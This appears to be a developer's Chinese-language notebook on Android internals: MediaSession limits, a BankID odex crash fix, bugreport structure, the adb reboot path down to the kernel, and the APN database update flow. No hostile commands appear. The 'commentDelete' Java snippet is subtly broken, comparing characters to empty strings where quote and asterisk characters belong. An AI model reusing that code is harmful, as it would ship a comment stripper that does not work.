        Log.d(TAG, "uid(" + uid + ") hasn't granted MEDIA_CONTENT_CONTROL");
    }
    return false;
}

只有sharedUserId=system，或者有 media_content_control 的应用才可以
有几个疑问
1.为什么打开关闭蓝牙的时候没有关闭session?如何关闭session?
2.SESSION_CREATION_LIMIT_PER_UID = 100;  这个值是否可以改大？
3.给 Music MEDIA_CONTENT_CONTROL 的权限，权限加了没用，这个权限貌似只有 system_server 和 platform 签名的应用才能使用
4.有权限之后，session可以无限创建吗？会不会OOM或者且他问题？

测试方法
1.修改 MediaSessionService.java 中的 SESSION_CREATION_LIMIT_PER_UID = 5;    //可以减少测试次数
2.在 final int sessionCount = user.mUidToSessionCount.get(callerUid, 0); 后面添加如下log
android.util.Log.e("zq8888", "Time:2021-10-14 15:44:03-->"+Thread.currentThread().getStackTrace()[2] .getClassName()+"-->"+Thread.currentThread().getStackTrace()[2] .getMethodName()+"()-->"+Thread.currentThread().getStackTrace()[2] .getLineNumber()+" sessionCount:"+sessionCount+" hasMediaControlPermission:"+hasMediaControlPermission);
3.运行自己写的脚本 runTest bt
adb shell svc bluetooth enable/disable
打log观察

4.使用测试组提供的runMTBF脚本
```

## [知识点] MTBF

```text
MTBF，即平均无故障工作时间，英文全称是“Mean Time Between Failure”。 是衡量一个产品（尤其是电器产品）的可靠性指标。 单位为“小时”。 ... 同时也规定产品在总的使用阶段累计工作时间与故障次数的比值为MTBF。
```

## 预置BandID打开之后报错

```text
01-09 00:00:31.221  2090  2090 E AndroidRuntime: FATAL EXCEPTION: main
01-09 00:00:31.221  2090  2090 E AndroidRuntime: Process: com.bankid.bus, PID: 2090
01-09 00:00:31.221  2090  2090 E AndroidRuntime: java.lang.RuntimeException: Unable to instantiate application com.bankid.bus.application.BankIDApplication: java.lang.ClassNotFoundException: Didn't find class "com.bankid.bus.application.BankIDApplication" on path: DexPathList[[zip file "/system/app/BankID/BankID.apk"] ,nativeLibraryDirectories=[/system/app/BankID/lib/arm, /system/app/BankID/BankID.apk!/lib/armeabi-v7a, /system/lib, /vendor/lib, /system/lib, /vendor/lib] ] 
01-09 00:00:31.221  2090  2090 E AndroidRuntime:  at android.app.LoadedApk.makeApplication(LoadedApk.java:999)
01-09 00:00:31.221  2090  2090 E AndroidRuntime:  at android.app.ActivityThread.handleBindApplication(ActivityThread.java:5756)
01-09 00:00:31.221  2090  2090 E AndroidRuntime:  at android.app.ActivityThread.-wrap1(Unknown Source:0)
01-09 00:00:31.221  2090  2090 E AndroidRuntime:  at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1690)
01-09 00:00:31.221  2090  2090 E AndroidRuntime:  at android.os.Handler.dispatchMessage(Handler.java:106)
01-09 00:00:31.221  2090  2090 E AndroidRuntime:  at android.os.Looper.loop(Looper.java:164)
01-09 00:00:31.221  2090  2090 E AndroidRuntime:  at android.app.ActivityThread.main(ActivityThread.java:6548)
01-09 00:00:31.221  2090  2090 E AndroidRuntime:  at java.lang.reflect.Method.invoke(Native Method)
01-09 00:00:31.221  2090  2090 E AndroidRuntime:  at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:438)
01-09 00:00:31.221  2090  2090 E AndroidRuntime:  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:857)
01-09 00:00:31.221  2090  2090 E AndroidRuntime: Caused by: java.lang.ClassNotFoundException: Didn't find class "com.bankid.bus.application.BankIDApplication" on path: DexPathList[[zip file "/system/app/BankID/BankID.apk"] ,nativeLibraryDirectories=[/system/app/BankID/lib/arm, /system/app/BankID/BankID.apk!/lib/armeabi-v7a, /system/lib, /vendor/lib, /system/lib, /vendor/lib] ] 
01-09 00:00:31.221  2090  2090 E AndroidRuntime:  at dalvik.system.BaseDexClassLoader.findClass(BaseDexClassLoader.java:125)
01-09 00:00:31.221  2090  2090 E AndroidRuntime:  at java.lang.ClassLoader.loadClass(ClassLoader.java:379)
01-09 00:00:31.221  2090  2090 E AndroidRuntime:  at java.lang.ClassLoader.loadClass(ClassLoader.java:312)
01-09 00:00:31.221  2090  2090 E AndroidRuntime:  at android.app.Instrumentation.newApplication(Instrumentation.java:1087)
01-09 00:00:31.221  2090  2090 E AndroidRuntime:  at android.app.LoadedApk.makeApplication(LoadedApk.java:993)
01-09 00:00:31.221  2090  2090 E AndroidRuntime:  ... 9 more
01-09 00:00:31.221  2090  2090 E AndroidRuntime:  Suppressed: java.lang.NoClassDefFoundError: Failed resolution of: Loo/᫃ࡢ;
01-09 00:00:31.221  2090  2090 E AndroidRuntime:   at java.lang.VMClassLoader.findLoadedClass(Native Method)
01-09 00:00:31.221  2090  2090 E AndroidRuntime:   at java.lang.ClassLoader.findLoadedClass(ClassLoader.java:738)
01-09 00:00:31.221  2090  2090 E AndroidRuntime:   at java.lang.ClassLoader.loadClass(ClassLoader.java:363)
01-09 00:00:31.221  2090  2090 E AndroidRuntime:   ... 12 more
01-09 00:00:31.221  2090  2090 E AndroidRuntime:  Caused by: java.lang.ClassNotFoundException: Didn't find class "oo.᫃ࡢ" on path: DexPathList[[zip file "/system/app/BankID/BankID.apk"] ,nativeLibraryDirectories=[/system/app/BankID/lib/arm, /system/app/BankID/BankID.apk!/lib/armeabi-v7a, /system/lib, /vendor/lib, /system/lib, /vendor/lib] ] 
01-09 00:00:31.221  2090  2090 E AndroidRuntime:   at dalvik.system.BaseDexClassLoader.findClass(BaseDexClassLoader.java:125)
01-09 00:00:31.221  2090  2090 E AndroidRuntime:   at java.lang.ClassLoader.loadClass(ClassLoader.java:379)
01-09 00:00:31.221  2090  2090 E AndroidRuntime:   at java.lang.ClassLoader.loadClass(ClassLoader.java:312)
01-09 00:00:31.221  2090  2090 E AndroidRuntime:   ... 15 more

解决：
需要去掉odex优化，需要在 Android.mk 文件中添加如下代码：
LOCAL_DEX_PREOPT := false
```

## TODO : 修改字体为Large之后再恢复到Default会比原来的Default字体大？

```text
可能是默认字体比较小？但是没有找到默认 system.proto 设置字体的地方？
```

## DDoS

```text
分布式拒绝服务（DDoS）攻击是通过大规模互联网流量淹没目标服务器或其周边基础设施，以破坏目标服务器、服务或网络正常流量的恶意行为。

DDoS 攻击利用多台受损计算机系统作为攻击流量来源以达到攻击效果。利用的机器可以包括计算机，也可以包括其他联网资源（如 IoT 设备）。

总体而言，DDoS 攻击好比高速公路发生交通堵塞，妨碍常规车辆抵达预定目的地。
```

## TODO : TelephonyManager 监听 PhoneState 的变化？

```text
mTelephonyManager = (TelephonyManager) mApp.getActivity().getSystemService(Context.TELEPHONY_SERVICE);
mTelephonyManager.listen(new PhoneStateListener() {                     //为什么这样写只能监听到一次PhoneState的变化呢？ PhoneStateListener必须在主线程中初始化
    @Override
    public void onCallStateChanged(int state, String incomingNumber) {
        switch (state) {
            case TelephonyManager.CALL_STATE_RINGING:
                if (getVideoState() == VideoState.STATE_RECORDING) {
                    mVideoHandler.sendEmptyMessage(HANDLER_STOP_RECORDING);
                }
                break;
            }
    }
}, PhoneStateListener.LISTEN_CALL_STATE);

为什么监听不到HangOff的状态变化？
```

## 去除代码中的注释

```text
public static String commentDelete(String code) {
    String result = "";
    boolean string = false;//字符串状态
    boolean comment = false;
    boolean comment2 = false;
    String comments = "";
    boolean comments2 = false;
    for (String chars : code.split("")) {
        if (!string && chars.equals("") && !(comment || comment2 || comments2)) {
            string = true;
        } else if (string && chars.equals("") && !(comment || comment2 || comments2)) {
            string = false;
        } else if (string) {
        }
        if (!string) {
            if (comment && chars.equals("/")) {
                //是注释
                if (comment) {
                    comment2 = true;
                } else if (comment && chars.equals("")) {
                    comments2 = true;
                }
            } else if (!comment && !comment2 && chars.equals("/")) {
                //可能是注释，开始判断吧
                comment = true;
            } else if ((comment && comment2) && chars.equals("\n")) {
                comment = false;
                comment2 = false;
            } else if (comments2 && chars.equals("")) {
                comments = chars;
            } else if (!(comments.equalsIgnoreCase("*")) && comment2 && chars.equals("/")) {
                comments = "";
                comments2 = false;
            }
            if (!comment) {
                result = result + chars;
            }
        } else {
            result = result + chars;
        }
    }
    return result;
}
```

## TODO : bugreport 原理分析

```text
https://blog.csdn.net/su749520/article/details/80541088
https://blog.csdn.net/u010164190/article/details/72875984

http://gityuan.com/2016/06/10/bugreport/
http://gityuan.com/2016/06/11/bugreport-2/

bugreport通过socket与dumpstate服务建立通信，在dumpstate.cpp中的dumpstate()方法完成核心功能，该功能依次输出内容项， 主要分为5大类：

current log： kernel,system, event, radio;
last log： kernel, system, radio;
vm traces： just now, last ANR, tombstones
dumpsys： all, checkin, app
system info：cpu, memory, io等
从bugreport内容的输出顺序的角度，再详细列举其内容：

系统build以及运行时长等相关信息；
内存/CPU/进程等信息；
kernel log；
lsof、map及Wait-Channels；
system log；
event log；
radio log;
vm traces：
VM TRACES JUST NOW (/data/anr/traces.txt.bugreport) (抓bugreport时主动触发)
VM TRACES AT LAST ANR (/data/anr/traces.txt) (存在则输出)
TOMBSTONE (/data/tombstones/tombstone_xx) (存在这输出)
network相关信息；
last kernel log;
last system log;
ip相关信息；
中断向量表
property以及fs等信息
last radio log;
Binder相关信息；
dumpsys all：
dumpsys checkin相关:
dumpsys batterystats 电池统计；
dumpsys meminfo内存
dumpsys netstats网络统计；
dumpsys procstats进程统计；
dumpsys usagestats使用情况；
dumpsys package.
dumpsys app相关
dumpsys activity;
dumpsys activity service all;
dumpsys activity provider all.
Tips： bugreport几乎涵盖整个系统信息，内容非常长，每一个子项都以------ xxx ------开头。 例如APP ACTIVITIES的开头便是 ------ APP ACTIVITIES (dumpsys activity all) ------，其中括号内的便是输出该信息指令，即dumpsys activity all，还有可能是内容所在节点，各个子项目类似的规律，看完前面的源码分析过程，相信你肯定能明白。下面一篇文章再进一步从bugreport内容的角度来说明其寓意。
```

## TODO : bugreportz 和 bugreport 的区别？

## TODO : battery historion 是如何分析 bugreport 拿到电池曲线的？

## [prop] 如何监听 SystemProperty 的变化??

```text
https://blog.csdn.net/m0_52481422/article/details/109776370

@UnsupportedAppUsage
public static void addChangeCallback(@NonNull Runnable callback) {
    synchronized (sChangeCallbacks) {
        if (sChangeCallbacks.size() == 0) {
            native_add_change_callback();
        }
        sChangeCallbacks.add(callback);
    }
}

on property:persist.debug.atrace.boottrace=1
    start boottrace
```

## batterywarning源码分析

```text
vendor/mediatek/proprietary/frameworks/opt/batterywarning
```

## adb shell ime 源码分析

```text
pathmod ime
frameworks/base/cmds/ime

frameworks/base/cmds/ime/ime
#!/system/bin/sh
exec cmd input_method ime "$@"

system/sepolicy/private/service_contexts
input_method u:object_r:input_method_service:s0

frameworks/base/core/java/android/app/SystemServiceRegistry.java
registerService(Context.INPUT_METHOD_SERVICE, InputMethodManager.class,
        new ServiceFetcher<InputMethodManager>() {
    @Override
    public InputMethodManager getService(ContextImpl ctx) {
        return InputMethodManager.forContext(ctx.getOuterContext());
    }});

frameworks/base/services/core/java/com/android/server/inputmethod/InputMethodManager.java
@BinderThread
@ShellCommandResult
@Override
public int onCommand(@Nullable String cmd) {
    // For shell command, require all the permissions here in favor of code simplicity.
    Arrays.asList(
            Manifest.permission.DUMP,
            Manifest.permission.INTERACT_ACROSS_USERS_FULL,
            Manifest.permission.WRITE_SECURE_SETTINGS
    ).forEach(permission -> mService.mContext.enforceCallingPermission(permission, null));

    final long identity = Binder.clearCallingIdentity();
    try {
        return onCommandWithSystemIdentity(cmd);
    } finally {
        Binder.restoreCallingIdentity(identity);
    }
}

frameworks/base/services/core/java/com/android/server/inputmethod/InputMethodManagerService.java
@BinderThread
@ShellCommandResult
private int onCommandWithSystemIdentity(@Nullable String cmd) {
    if ("refresh_debug_properties".equals(cmd)) {           // 这个 refresh_debug_properties 命令什么时候会用到？
        return refreshDebugProperties();
    }

    if ("get-last-switch-user-id".equals(cmd)) {
        return mService.getLastSwitchUserId(this);
    }

    // For existing "adb shell ime <command>".
    if ("ime".equals(cmd)) {
        final String imeCommand = getNextArg();
        if (imeCommand == null || "help".equals(imeCommand) || "-h".equals(imeCommand)) {
            onImeCommandHelp();
            return ShellCommandResult.SUCCESS;
        }
        switch (imeCommand) {
            case "list":
                return mService.handleShellCommandListInputMethods(this);
            case "enable":
                return mService.handleShellCommandEnableDisableInputMethod(this, true);
            case "disable":
                return mService.handleShellCommandEnableDisableInputMethod(this, false);
            case "set":
                return mService.handleShellCommandSetInputMethod(this);
            case "reset":
                return mService.handleShellCommandResetInputMethod(this);
            default:
                getOutPrintWriter().println("Unknown command: " + imeCommand);
                return ShellCommandResult.FAILURE;
        }
    }

    return handleDefaultCommands(cmd);
}
```

## adb reboot 源码分析

```text
system/core/reboot/reboot.c
int main(int argc, char* argv[] ) {
    int ret;
    size_t prop_len;
    char property_val[PROPERTY_VALUE_MAX] ;
    static const char reboot[]  = "reboot";
    const char* cmd = reboot;
    char* optarg = "";

    opterr = 0;
    do {
        int c;

        c = getopt(argc, argv, "p");        //获取参数

        if (c == -1) {                      //参数不存在
            break;
        }

        switch (c) {
        case 'p':
            cmd = "shutdown";
            break;
        case '?':
            fprintf(stderr, "usage: %s [-p]  [rebootcommand] \n", argv[0] );
            exit(EXIT_FAILURE);
        }
    } while (1);

    if(argc > optind + 1) {
        fprintf(stderr, "%s: too many arguments\n", argv[0] );
        exit(EXIT_FAILURE);
    }

    if (argc > optind)
        optarg = argv[optind] ;
    if (!optarg || !optarg[0] ) optarg = "shell";

    prop_len = snprintf(property_val, sizeof(property_val), "%s,%s", cmd, optarg);
    if (prop_len >= sizeof(property_val)) {
        fprintf(stderr, "%s command too long: %s\n", cmd, optarg);
        exit(EXIT_FAILURE);
    }

    ret = property_set(ANDROID_RB_PROPERTY, property_val);  //#define ANDROID_RB_PROPERTY "sys.powerctl"
    if (ret < 0) {
        perror(cmd);
        exit(EXIT_FAILURE);
    }

    // Don't return early. Give the reboot command time to take effect
    // to avoid messing up scripts which do "adb shell reboot && adb wait-for-device"
    if (cmd == reboot) {
        while (1) {
            pause();
        }
    }

    fprintf(stderr, "Done\n");
    return 0;
}

system/core/init/property_service.cpp
// This returns one of the enum of PROP_SUCCESS or PROP_ERROR*.
uint32_t HandlePropertySet(const std::string& name, const std::string& value,
                           const std::string& source_context, const ucred& cr,
                           SocketConnection* socket, std::string* error) {
#ifdef MTK_LOG
    SnapshotPropertyFlowTraceLog("CPs " + name);
#endif
    if (auto ret = CheckPermissions(name, value, source_context, cr, error); ret != PROP_SUCCESS) {
        return ret;
    }

    if (StartsWith(name, "ctl.")) {
        return SendControlMessage(name.c_str() + 4, value, cr.pid, socket, error);
    }

    // sys.powerctl is a special property that is used to make the device reboot.  We want to log
    // any process that sets this property to be able to accurately blame the cause of a shutdown.
    if (name == "sys.powerctl") {                                           // 当设置 sys.powerctl 值的时候
        std::string cmdline_path = StringPrintf("proc/%d/cmdline", cr.pid);
        std::string process_cmdline;
        std::string process_log_string;
        if (ReadFileToString(cmdline_path, &process_cmdline)) {
            // Since cmdline is null deliminated, .c_str() conveniently gives us just the process
            // path.
            process_log_string = StringPrintf(" (%s)", process_cmdline.c_str());
        }
        LOG(INFO) << "Received sys.powerctl='" << value << "' from pid: " << cr.pid
                  << process_log_string;
        if (value == "reboot,userspace" && !is_userspace_reboot_supported().value_or(false)) {
            *error = "Userspace reboot is not supported by this device";
            return PROP_ERROR_INVALID_VALUE;
        }
    }

    // If a process other than init is writing a non-empty value, it means that process is
    // requesting that init performs a restorecon operation on the path specified by 'value'.
    // We use a thread to do this restorecon operation to prevent holding up init, as it may take
    // a long time to complete.
    if (name == kRestoreconProperty && cr.pid != 1 && !value.empty()) {
        static AsyncRestorecon async_restorecon;
        async_restorecon.TriggerRestorecon(value);
        return PROP_SUCCESS;
    }

    return PropertySet(name, value, error);
}

c++中SetProp的方法
android::base::SetProperty(ANDROID_RB_PROPERTY, "reboot,fastboot");

property_set(ANDROID_RB_PROPERTY, property_val);


在aosp源码中没有找到对 sys.powerctl 的处理，有可能在 libcutils.so 中

=》在init.rc中和一个相关的on 触发器
396 on property:sys.powerctl=*
397     powerctl ${sys.powerctl}  

=》会调用 builtins.c 的，参考间reboot,recovery
int do_powerctl(int nargs, char **args)     

=>
return android_reboot(cmd, 0, reboot_target);
cmd = ANDROID_RB_RESTART2  //在android_reboot.h中#define ANDROID_RB_RESTART2 0xDEAD0003
reboot_target =第二个参考recovery

 =》
/system/core/libcutils/android_reboot.c 中的执行android_reboot();

case ANDROID_RB_RESTART2:                                                                                                                         
121             ret =  __reboot(LINUX_REBOOT_MAGIC1, LINUX_REBOOT_MAGIC2,
122                            LINUX_REBOOT_CMD_RESTART2, arg);  //arg = recovery

=>
这个在bionic/libc/include/sys/reboot.h中定义的。说明这是一个标准的系统调用
extern int __reboot(int, int, int, void *); 

具体位于bionic/libc/arch-arm/syscalls/__reboot.S
1 /* autogenerated by gensyscalls.py */
2 #include <asm/unistd.h>
3 #include <linux/err.h>
4 #include <machine/asm.h>
5                                                                                                                                                           
6 ENTRY(__reboot)
7     mov     ip, r7
8     ldr     r7, =__NR_reboot
9     swi     #0
10     mov     r7, ip
11     cmn     r0, #(MAX_ERRNO + 1)
12     bxls    lr
13     neg     r0, r0
14     b       __set_errno
15 END(__reboot)


=》最后会进入Kernel
kernel/sys.c
     case LINUX_REBOOT_CMD_RESTART2:
          if (strncpy_from_user(&buffer[0] , arg, sizeof(buffer) - 1) < 0) {
               ret = -EFAULT;
               break;
          }
          buffer[sizeof(buffer) - 1]  = '\0';

           kernel_restart(buffer);   //buffer = arg= recovery
          break;

=>machine_restart()

=>arch/arm/kernel/process.c
void machine_restart(char *cmd)
{
     local_irq_disable();
     smp_send_stop();

     /* Flush the console to make sure all the relevant messages make it
     * out to the console drivers */
     arm_machine_flush_console();

      arm_pm_restart(reboot_mode, cmd);

     /* Give a grace period for failure to restart of 1s */
     mdelay(1000); // 1s之内没有restart完成就reboot失败。

     /* Whoops - the platform was unable to reboot. Tell the user! */
     printk("Reboot failed -- System halted\n");
     local_irq_disable();
     while (1);
}

=》
void (*arm_pm_restart)(char str, const char *cmd) = arm_machine_restart;
=》
void arm_machine_restart(char mode, const char *cmd)
{
...
aml_write_reg32(P_AO_RTI_STATUS_REG1, reboot_reason);  //这一个标志寄存器
...

arch_reset(mode, cmd); // mode = 'h' cmd = "recovery"
}

差不多了，尝试就如此吧。

那么有必要了解这个寄存器P_AO_RTI_STATUS_REG1在下次启动的时候，uboot是什么时候读。这就可以实现一些关机之后的状态保存。
```

## TODO : 如何提高input keyevent 的速度？

```text
能否参考一下monkey的代码
```

## APN更新流程

```text
TelephonyProvider.java
@Override
public boolean onCreate() {
    mOpenHelper = new DatabaseHelper(getContext());

    try {
        PhoneFactory.addLocalLog(TAG, 100);
    } catch (IllegalArgumentException e) {
        // ignore
    }

    boolean isNewBuild = false;
    String newBuildId = SystemProperties.get("ro.build.id", null);
    if (!TextUtils.isEmpty(newBuildId)) {
        // Check if build id has changed
        SharedPreferences sp = getContext().getSharedPreferences(BUILD_ID_FILE,
                Context.MODE_PRIVATE);
        String oldBuildId = sp.getString(RO_BUILD_ID, "");
        if (!newBuildId.equals(oldBuildId)) {                   //判断 ro.build.id 是否发生变化
            localLog("onCreate: build id changed from " + oldBuildId + " to " + newBuildId);
            isNewBuild = true;
        } else {
            if (VDBG) log("onCreate: build id did not change: " + oldBuildId);
        }
        sp.edit().putString(RO_BUILD_ID, newBuildId).apply();
    } else {
        if (VDBG) log("onCreate: newBuildId is empty");
    }

    if (isNewBuild) {                                           //如果 ro.build.id 改变了
        if (!apnSourceServiceExists(getContext())) {            //如果 apnSourceService 不存在
            // Update APN DB
            updateApnDb();                                      //更新apn
        }

        // Add all APN related shared prefs to local log for dumpsys
        if (DBG) addAllApnSharedPrefToLocalLog();
    }

    SharedPreferences sp = getContext().getSharedPreferences(ENFORCED_FILE,
            Context.MODE_PRIVATE);
    mManagedApnEnforced = sp.getBoolean(ENFORCED_KEY, false);

    if (VDBG) log("onCreate:- ret true");

    return true;
}


private synchronized void updateApnDb() {
    if (apnSourceServiceExists(getContext())) {
        loge("called updateApnDb when apn source service exists");
        return;
    }

    if (!needApnDbUpdate()) {                                   //通过 apns-conf.xml 文件的 sum(CRC32) 判断 apns-conf.xml 文件是否发生变化
        log("Skipping apn db update since apn-conf has not changed.");
        return;
    }

    SQLiteDatabase db = getWritableDatabase();

    // Delete preferred APN for all subIds
    deletePreferredApnId(getContext());                         //删除用户选择的 preferred 的 apn

    // Delete entries in db
    try {
        if (VDBG) log("updateApnDb: deleting edited=UNEDITED entries");
        db.delete(CARRIERS_TABLE, IS_UNEDITED + " and " + IS_NOT_OWNED_BY_DPC, null);   //删除未被编辑过的apn
    } catch (SQLException e) {
        loge("got exception when deleting to update: " + e);
    }

    initDatabaseWithDatabaseHelper(db);                         //重新初始化apn数据库

    // Notify listeners of DB change since DB has been updated
    getContext().getContentResolver().notifyChange(
            CONTENT_URI, null, true, UserHandle.USER_ALL);

}

private boolean apnDbUpdateNeeded() {
    File confFile = getApnConfFile();
    long newChecksum = getChecksum(confFile);
    long oldChecksum = getApnConfChecksum();
    if (DBG) log("newChecksum: " + newChecksum);
    if (DBG) log("oldChecksum: " + oldChecksum);
    if (newChecksum == oldChecksum) {
        return false;
    } else {
        return true;
    }
}

void initDatabaseWithDatabaseHelper(SQLiteDatabase db) {
    mOpenHelper.initDatabase(db);
}

private void initDatabase(SQLiteDatabase db) {
    if (VDBG) log("dbh.initDatabase:+ db=" + db);
    // Read internal APNS data
    Resources r = mContext.getResources();
    int publicversion = -1;
    if (r != null) {
        XmlResourceParser parser = r.getXml(com.android.internal.R.xml.apns);
        try {
            XmlUtils.beginDocument(parser, "apns");
            publicversion = Integer.parseInt(parser.getAttributeValue(null, "version"));
            loadApns(db, parser);
        } catch (Exception e) {
            loge("Got exception while loading APN database." + e);
        } finally {
            parser.close();
        }
    } else {
        loge("initDatabase: resources=null");
    }

    // Read external APNS data (partner-provided)
    XmlPullParser confparser = null;
    File confFile = getApnConfFile();                               // 按优先级顺序选择apn文件

    FileReader confreader = null;
    if (DBG) log("confFile = " + confFile);
    try {
        confreader = new FileReader(confFile);
        confparser = Xml.newPullParser();
        confparser.setInput(confreader);
        XmlUtils.beginDocument(confparser, "apns");                 // 通过 FileReader 读取 apns-conf.xml 文件，并通过 XmlUtils 进行解析

        // Sanity check. Force internal version and confidential versions to agree
        int confversion = Integer.parseInt(confparser.getAttributeValue(null, "version"));
        if (publicversion != confversion) {                         // 判断 apns-conf.xml 文件中的版本号是否和 com.android.internal.R.xml.apns (frameworks/base/core/res/res/xml/apns.xml)文件中的版本号一致
            log("initDatabase: throwing exception due to version mismatch");
            throw new IllegalStateException("Internal APNS file version doesn't match "
                    + confFile.getAbsolutePath());
        }

        loadApns(db, confparser);                                   // 加载 apns 到 telephony.db 数据库
    } catch (FileNotFoundException e) {
        // It's ok if the file isn't found. It means there isn't a confidential file
        // Log.e(TAG, "File not found: '" + confFile.getAbsolutePath() + "'");
    } catch (Exception e) {
        loge("initDatabase: Exception while parsing '" + confFile.getAbsolutePath() + "'" +
                e);
    } finally {
        // Get rid of user/carrier deleted entries that are not present in apn xml file.
        // Those entries have edited value USER_DELETED/CARRIER_DELETED.
        if (VDBG) {
            log("initDatabase: deleting USER_DELETED and replacing "
                    + "DELETED_BUT_PRESENT_IN_XML with DELETED");
        }

        // Delete USER_DELETED
        db.delete(CARRIERS_TABLE, IS_USER_DELETED + " or " + IS_CARRIER_DELETED, null);

        // Change USER_DELETED_BUT_PRESENT_IN_XML to USER_DELETED
        ContentValues cv = new ContentValues();
        cv.put(EDITED_STATUS, USER_DELETED);
        db.update(CARRIERS_TABLE, cv, IS_USER_DELETED_BUT_PRESENT_IN_XML, null);

        // Change CARRIER_DELETED_BUT_PRESENT_IN_XML to CARRIER_DELETED
        cv = new ContentValues();
        cv.put(EDITED_STATUS, CARRIER_DELETED);
        db.update(CARRIERS_TABLE, cv, IS_CARRIER_DELETED_BUT_PRESENT_IN_XML, null);

        if (confreader != null) {
            try {
                confreader.close();
            } catch (IOException e) {
                // do nothing
            }
        }

        // Update the stored checksum
        setApnConfChecksum(getChecksum(confFile));   // 计算当前 apns-conf.xml 文件的 sum值(CRC32) 到 SharedPreference(/data/user_de/0/com.android.providers.telephony/shared_prefs/telephonyprovider.xml)
    }
    if (VDBG) log("dbh.initDatabase:- db=" + db);
}

cat /data/user_de/0/com.android.providers.telephony/shared_prefs/telephonyprovider.xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <long name="apn_conf_checksum" value="2925820619" />
</map>


private static final String PARTNER_APNS_PATH = "etc/apns-conf.xml";
private static final String OEM_APNS_PATH = "telephony/apns-conf.xml";
private static final String OTA_UPDATED_APNS_PATH = "misc/apns/apns-conf.xml";
private static final String OLD_APNS_PATH = "etc/old-apns-conf.xml";
private File getApnConfFile() {
    // Environment.getRootDirectory() is a fancy way of saying ANDROID_ROOT or "/system".
    File confFile = new File(Environment.getRootDirectory(), PARTNER_APNS_PATH);            //  /system/etc/apns-conf.xml
    File oemConfFile =  new File(Environment.getOemDirectory(), OEM_APNS_PATH);             //  /oem/telephony/apns-conf.xml
    File updatedConfFile = new File(Environment.getDataDirectory(), OTA_UPDATED_APNS_PATH); //  /data/misc/apns/apns-conf.xml
    File productConfFile = new File(Environment.getProductDirectory(), PARTNER_APNS_PATH);  //  /product/etc/apns-conf.xml
    confFile = pickSecondIfExists(confFile, oemConfFile);
    confFile = pickSecondIfExists(confFile, productConfFile);
    confFile = pickSecondIfExists(confFile, updatedConfFile);
    return confFile;
}


private long getChecksum(File file) {
    CRC32 checkSummer = new CRC32();                                // 通过 CRC32 计算文件的 sum
    long checkSum = -1;
    try (CheckedInputStream cis =
        new CheckedInputStream(new FileInputStream(file), checkSummer)){
        byte[]  buf = new byte[128] ;
        if(cis != null) {
            while(cis.read(buf) >= 0) {
                // Just read for checksum to get calculated.
            }
        }
        checkSum = checkSummer.getValue();
        if (DBG) log("Checksum for " + file.getAbsolutePath() + " is " + checkSum);
    } catch (FileNotFoundException e) {
        loge("FileNotFoundException for " + file.getAbsolutePath() + ":" + e);
    } catch (IOException e) {
        loge("IOException for " + file.getAbsolutePath() + ":" + e);
    }

    // The RRO may have been updated in a firmware upgrade. Add checksum for the
    // resources to the total checksum so that apns in an RRO update is not missed.
    try (InputStream inputStream = mContext.getResources().
                openRawResource(com.android.internal.R.xml.apns)) {
        byte[]  array = toByteArray(inputStream);
        checkSummer.reset();
        checkSummer.update(array);
        checkSum += checkSummer.getValue();
        if (DBG) log("Checksum after adding resource is " + checkSummer.getValue());
    } catch (IOException | Resources.NotFoundException e) {
        loge("Exception when calculating checksum for internal apn resources: " + e);
    }
    return checkSum;
}

private void loadApns(SQLiteDatabase db, XmlPullParser parser) {
    if (parser != null) {
        try {
            db.beginTransaction();
            XmlUtils.nextElement(parser);
            while (parser.getEventType() != XmlPullParser.END_DOCUMENT) {
                ContentValues row = getRow(parser);
                if (row == null) {
                    throw new XmlPullParserException("Expected 'apn' tag", parser, null);
                }
                insertAddingDefaults(db, row);          //加载到数据库
                XmlUtils.nextElement(parser);
            }
            db.setTransactionSuccessful();
        } catch (XmlPullParserException e) {
            loge("Got XmlPullParserException while loading apns." + e);
        } catch (IOException e) {
            loge("Got IOException while loading apns." + e);
        } catch (SQLException e) {
            loge("Got SQLException while loading apns." + e);
        } finally {
            db.endTransaction();
        }
    }
}

private void insertAddingDefaults(SQLiteDatabase db, ContentValues row) {
    row = setDefaultValue(row);
    try {
        db.insertWithOnConflict(CARRIERS_TABLE, null, row, SQLiteDatabase.CONFLICT_ABORT);
        if (VDBG) log("dbh.insertAddingDefaults: db.insert returned >= 0; insert " +
                "successful for cv " + row);
    } catch (SQLException e) {
        if (VDBG) log("dbh.insertAddingDefaults: exception " + e);
        // Insertion failed which could be due to a conflict. Check if that is the case and
        // update edited field accordingly.
        // Search for the exact same entry and update edited field.
        // If it is USER_EDITED/CARRIER_EDITED change it to UNEDITED,
        // and if USER/CARRIER_DELETED change it to USER/CARRIER_DELETED_BUT_PRESENT_IN_XML.
        Cursor oldRow = selectConflictingRow(db, CARRIERS_TABLE, row);
        if (oldRow != null) {
            // Update the row
            ContentValues mergedValues = new ContentValues();
            int edited = oldRow.getInt(oldRow.getColumnIndex(EDITED_STATUS));
            int old_edited = edited;
            if (edited != UNEDITED) {
                if (edited == USER_DELETED) {
                    // USER_DELETED_BUT_PRESENT_IN_XML indicates entry has been deleted
                    // by user but present in apn xml file.
                    edited = USER_DELETED_BUT_PRESENT_IN_XML;
                } else if (edited == CARRIER_DELETED) {
                    // CARRIER_DELETED_BUT_PRESENT_IN_XML indicates entry has been deleted
                    // by user but present in apn xml file.
                    edited = CARRIER_DELETED_BUT_PRESENT_IN_XML;
                }
                mergedValues.put(EDITED_STATUS, edited);
            }

            mergeFieldsAndUpdateDb(db, CARRIERS_TABLE, oldRow, row, mergedValues, false,
                    mContext);

            if (VDBG) log("dbh.insertAddingDefaults: old edited = " + old_edited
                    + " new edited = " + edited);

            oldRow.close();
        }
    }
}
```

## 非对称加密算法

```text
非对称加密算法目前常用的有三种：
1. RSA(因数分解)
2. ElGamal DLG (离散数学问题) 
3. EC (Elliptic Curve, 椭圆曲线密码算法)

现在EC越来越流行，有取代 RSA 的趋势。

这里的意思是支持 RSA 和 EC 两种
```

## TODO : 能否加个注解在方法调用前后统计方法耗时？

## EDL模式

```text
EDL就是俗称的砖头模式，按POWER键后，屏幕依然是黑屏，没有任何显示，用USB线连接电脑，在设备管理器中有QDloader 9008的COM端口(需安装驱动Qualcomm_Drivers_QDLoader.zip)

